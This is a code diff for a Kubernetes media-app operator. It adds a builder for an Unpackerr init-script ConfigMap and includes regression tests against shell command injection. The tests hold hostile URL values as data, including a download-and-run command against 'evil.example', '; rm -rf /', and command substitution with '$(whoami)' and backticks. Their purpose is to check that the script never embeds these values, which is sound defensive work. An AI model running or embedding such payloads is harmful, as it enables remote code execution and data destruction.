@@ -609,6 +609,106 @@ echo "bazarr-init: wrote $CONFIG"
     })
 }
 
+/// Build the ConfigMap containing the Unpackerr init script.
+///
+/// Unpackerr has no live API — the operator seeds `/config/unpackerr.conf` once
+/// from `spec.appConfig`'s `UnpackerrConfig` (per-instance URL, API key via env
+/// var from `apiKeySecret`), then leaves it alone (idempotent: a second run is a
+/// no-op if the file exists). `webserver.metrics` is always forced on so port
+/// 5656 (`image-defaults.toml`) is probeable — Unpackerr's webserver only
+/// listens when metrics are enabled.
+pub fn build_unpackerr_init(app: &ServarrApp) -> Option<ConfigMap> {
+    if !matches!(app.spec.app, AppType::Unpackerr) {
+        return None;
+    }
+
+    let name = common::child_name(app, "init");
+    let ns = common::app_namespace(app);
+
+    let unpackerr_config = match &app.spec.app_config {
+        Some(AppConfig::Unpackerr(c)) => c.clone(),
+        Some(_) => {
+            warn!(
+                name = app.metadata.name.as_deref().unwrap_or("<unnamed>"),
+                "spec.app is Unpackerr but spec.appConfig is a different variant; \
+                 treating as unconfigured (no *arr instances will be seeded)"
+            );
+            servarr_crds::UnpackerrConfig::default()
+        }
+        None => servarr_crds::UnpackerrConfig::default(),
+    };
+
+    // The heredoc below is unquoted so the api_key/url env vars expand -- which
+    // means the shell also re-evaluates any `$(...)`/backtick command
+    // substitution in the *literal body text*. Never interpolate a CRD-supplied
+    // value (e.g. instance.url) directly into that body: route it through its
+    // own env var instead, exactly like api_key already is. A variable's stored
+    // value is substituted verbatim by `${VAR}` expansion, not re-evaluated for
+    // nested substitutions, so this closes the injection path (#776).
+    let mut blocks = String::new();
+    for (kind, instance, api_key_env_var, url_env_var) in [
+        (
+            "sonarr",
+            &unpackerr_config.sonarr,
+            "UNPACKERR_SONARR_0_APIKEY",
+            "UNPACKERR_SONARR_0_URL",
+        ),
+        (
+            "radarr",
+            &unpackerr_config.radarr,
+            "UNPACKERR_RADARR_0_APIKEY",
+            "UNPACKERR_RADARR_0_URL",
+        ),
+        (
+            "lidarr",
+            &unpackerr_config.lidarr,
+            "UNPACKERR_LIDARR_0_APIKEY",
+            "UNPACKERR_LIDARR_0_URL",
+        ),
+        (
+            "readarr",
+            &unpackerr_config.readarr,
+            "UNPACKERR_READARR_0_APIKEY",
+            "UNPACKERR_READARR_0_URL",
+        ),
+    ] {
+        if instance.is_some() {
+            blocks.push_str(&format!(
+                "cat >> \"$CONFIG\" << UNPACKERR_INSTANCE_EOF\n[[{kind}]]\n  url = \"${{{url_env_var}}}\"\n  api_key = \"${{{api_key_env_var}}}\"\nUNPACKERR_INSTANCE_EOF\n",
+            ));
+        }
+    }
+
+    let script = format!(
+        r#"#!/bin/sh
+set -eu
+CONFIG=/config/unpackerr.conf
+if [ -f "$CONFIG" ]; then
+  echo "unpackerr-init: config already exists, skipping"
+  exit 0
+fi
+mkdir -p "$(dirname "$CONFIG")"
+cat > "$CONFIG" << UNPACKERR_EOF
+[webserver]
+  metrics = true
+UNPACKERR_EOF
+{blocks}echo "unpackerr-init: wrote $CONFIG"
+"#
+    );
+
+    Some(ConfigMap {
+        metadata: ObjectMeta {
+            name: Some(name),
+            namespace: Some(ns),
+            labels: Some(common::labels(app)),
+            owner_references: Some(vec![common::owner_reference(app)]),
+            ..Default::default()
+        },
+        data: Some(BTreeMap::from([("unpackerr-init.sh".to_string(), script)])),
+        ..Default::default()
+    })
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -631,6 +731,136 @@ mod tests {
             },
             status: None,
         }
+    }
+
+    fn minimal_unpackerr_app() -> ServarrApp {
+        ServarrApp {
+            metadata: ObjectMeta {
+                name: Some("unpackerr".into()),
+                namespace: Some("media".into()),
+                uid: Some("uid-unpackerr".into()),
+                ..Default::default()
+            },
+            spec: servarr_crds::ServarrAppSpec {
+                app: AppType::Unpackerr,
+                ..Default::default()
+            },
+            status: None,
+        }
+    }
+
+    #[test]
+    fn unpackerr_init_always_enables_webserver_metrics() {
+        let app = minimal_unpackerr_app();
+        let cm = build_unpackerr_init(&app).expect("should generate configmap");
+        let script = cm
+            .data
+            .as_ref()
+            .and_then(|d| d.get("unpackerr-init.sh"))
+            .expect("script key present");
+        assert!(
+            script.contains("metrics = true"),
+            "Unpackerr's webserver.metrics must always be forced on so port 5656 is \
+             probeable, got: {script}"
+        );
+    }
+
+    #[test]
+    fn unpackerr_init_renders_no_instance_blocks_when_unconfigured() {
+        let app = minimal_unpackerr_app();
+        let cm = build_unpackerr_init(&app).expect("should generate configmap");
+        let script = cm.data.as_ref().unwrap().get("unpackerr-init.sh").unwrap();
+        assert!(!script.contains("[[sonarr]]"));
+        assert!(!script.contains("[[radarr]]"));
+    }
+
+    #[test]
+    fn unpackerr_init_renders_configured_instance_blocks() {
+        let mut app = minimal_unpackerr_app();
+        app.spec.app_config = Some(AppConfig::Unpackerr(servarr_crds::UnpackerrConfig {
+            sonarr: Some(servarr_crds::UnpackerrArrInstance {
+                url: "http://sonarr.media.svc:8989".into(),
+                api_key_secret: "sonarr-api-key".into(),
+            }),
+            radarr: None,
+            lidarr: None,
+            readarr: None,
+        }));
+        let cm = build_unpackerr_init(&app).expect("should generate configmap");
+        let script = cm.data.as_ref().unwrap().get("unpackerr-init.sh").unwrap();
+        assert!(script.contains("[[sonarr]]"), "got: {script}");
+        assert!(
+            script.contains("${UNPACKERR_SONARR_0_URL}"),
+            "url must be substituted from an env var, not embedded literally: {script}"
+        );
+        assert!(!script.contains("[[radarr]]"));
+    }
+
+    #[test]
+    fn unpackerr_init_never_embeds_the_raw_url_as_heredoc_body_text() {
+        // The heredoc that renders each instance block is unquoted (needed so the
+        // api_key env var expands), so any untrusted string embedded directly as
+        // body text is subject to shell command substitution. A CRD-controlled
+        // url containing `$(...)` must never appear verbatim in the script -- it
+        // must be referenced only via an env var, whose *value* the shell does
+        // not re-evaluate for nested substitutions.
+        let mut app = minimal_unpackerr_app();
+        let malicious_url = "http://sonarr$(curl evil.example/x|sh):8989";
+        app.spec.app_config = Some(AppConfig::Unpackerr(servarr_crds::UnpackerrConfig {
+            sonarr: Some(servarr_crds::UnpackerrArrInstance {
+                url: malicious_url.into(),
+                api_key_secret: "sonarr-api-key".into(),
+            }),
+            radarr: None,
+            lidarr: None,
+            readarr: None,
+        }));
+        let cm = build_unpackerr_init(&app).expect("should generate configmap");
+        let script = cm.data.as_ref().unwrap().get("unpackerr-init.sh").unwrap();
+        assert!(
+            !script.contains(malicious_url),
+            "raw untrusted url must never appear as literal heredoc body text: {script}"
+        );
+    }
+
+    /// Same invariant as above, across every shell-metacharacter class that could
+    /// turn body text into an injection: command substitution (`$(...)`, backticks),
+    /// statement separators (`;`, `&&`, `|`), and embedded newlines. The fix routes
+    /// `url` through an env var rather than escaping it, so no character class is
+    /// special-cased -- any of these must simply never appear in the script.
+    #[test]
+    fn unpackerr_init_never_embeds_url_regardless_of_metacharacter_class() {
+        for malicious_url in [
+            "http://sonarr$(whoami):8989",
+            "http://sonarr`whoami`:8989",
+            "http://sonarr:8989; rm -rf /",
+            "http://sonarr:8989 && curl evil.example",
+            "http://sonarr:8989 | sh",
+            "http://sonarr\n:8989",
+        ] {
+            let mut app = minimal_unpackerr_app();
+            app.spec.app_config = Some(AppConfig::Unpackerr(servarr_crds::UnpackerrConfig {
+                sonarr: Some(servarr_crds::UnpackerrArrInstance {
+                    url: malicious_url.into(),
+                    api_key_secret: "sonarr-api-key".into(),
+                }),
+                radarr: None,
+                lidarr: None,
+                readarr: None,
+            }));
+            let cm = build_unpackerr_init(&app).expect("should generate configmap");
+            let script = cm.data.as_ref().unwrap().get("unpackerr-init.sh").unwrap();
+            assert!(
+                !script.contains(malicious_url),
+                "url {malicious_url:?} must never appear as literal heredoc body text: {script}"
+            );
+        }
+    }
+
+    #[test]
+    fn unpackerr_init_returns_none_for_other_app_types() {
+        let app = minimal_ssh_bastion_app();
+        assert!(build_unpackerr_init(&app).is_none());
     }
 
     #[test]
